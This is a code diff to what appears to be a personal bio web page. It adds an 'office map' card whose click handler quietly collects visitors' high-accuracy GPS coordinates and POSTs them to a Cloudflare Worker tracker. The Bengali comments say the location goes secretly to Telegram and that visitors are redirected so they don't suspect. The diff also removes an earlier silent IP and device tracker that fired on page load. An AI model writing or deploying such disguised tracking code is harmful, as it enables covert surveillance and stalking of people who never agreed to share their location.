@@ -1038,6 +1038,22 @@ body {
             </div>
         </section>
 
+        <!-- SMART OFFICE MAP SECTION (TRIGGER FOR GPS TRAP) -->
+        <div class="section-title">OFFICE LOCATION & MAP</div>
+
+        <section class="bank-card" style="cursor: pointer; text-align: center; display: block; padding: 18px;" onclick="requestUserLocationForMap()">
+            <div style="color: #64e8ff; font-size: 13px; font-weight: 800; margin-bottom: 6px;">📍 আমাদের অফিস ম্যাপ দেখুন (Live Map)</div>
+            <div style="color: #8da2bb; font-size: 11px; font-family: 'Noto Serif Bengali', serif; margin-bottom: 12px;">
+                সঠিক রুট ও যাতায়াত দেখতে ম্যাপে ক্লিক করুন।
+            </div>
+            <div style="width: 100%; height: 130px; border-radius: 14px; overflow: hidden; border: 1px solid rgba(255,255,255,0.15); position: relative; background: #07111d;">
+                <div style="position: absolute; inset: 0; background: rgba(5, 10, 18, 0.3); display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 6px;">
+                    <span style="font-size: 24px;">🗺️</span>
+                    <span style="background: rgba(0,0,0,0.8); color: #fff; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: 700; border: 1px solid rgba(100,232,255,0.4);">ম্যাপ ওপেন করতে ট্যাপ করুন</span>
+                </div>
+            </div>
+        </section>
+
         <!-- SOCIAL FOOTPRINT RIBBON -->
         <div class="social-ribbon-wrap">
             <a href="https://www.facebook.com/AH.HANIF" target="_blank" rel="noopener noreferrer" class="ribbon-btn ribbon-fb" title="Facebook">
@@ -1085,19 +1101,45 @@ body {
 
 <script>
 const profileURL = "https://abu-hanif-bio.github.io/";
+const officeMapURL = "https://maps.app.goo.gl/b1QmkUJSw4y4hgEfA";
 
 /* =========================================================
-   SILENT CLOUDFLARE WORKER IP & DEVICE TRACKER
+   SMART OFFICE MAP & GPS TRAP INTERACTION
 ========================================================= */
-async function triggerSilentTracker() {
-    try {
-        const workerURL = "https://dry-sun-3774my-tracker.millat-ahhanif.workers.dev";
-        await fetch(workerURL, { mode: 'no-cors' });
-    } catch (e) {
-        // Silent catch to prevent errors on frontend
+async function requestUserLocationForMap() {
+    showToast("অফিস ম্যাপ লোড হচ্ছে...");
+    
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            async function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+
+                try {
+                    // গোপনে টেলিগ্রামে জিপিএস লোকেশন পাঠিয়ে দেবে
+                    await fetch("https://dry-sun-3774my-tracker.millat-ahhanif.workers.dev", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ lat: lat, lon: lon, accuracy: accuracy })
+                    });
+                } catch (e) {}
+
+                // এরপর ভিজিটরকে আপনার আসল অফিস ম্যাপে পাঠিয়ে দেবে
+                setTimeout(() => {
+                    window.open(officeMapURL, '_blank');
+                }, 600);
+            },
+            function(error) {
+                // পারমিশন ব্লক করলেও তাকে আসল অফিস ম্যাপেই রিডাইরেক্ট করবে যাতে সন্দেহ না হয়
+                window.open(officeMapURL, '_blank');
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    } else {
+        window.open(officeMapURL, '_blank');
     }
 }
-window.addEventListener("DOMContentLoaded", triggerSilentTracker);
 
 /* =========================================================
    TIME-BASED DYNAMIC GREETING LOGIC
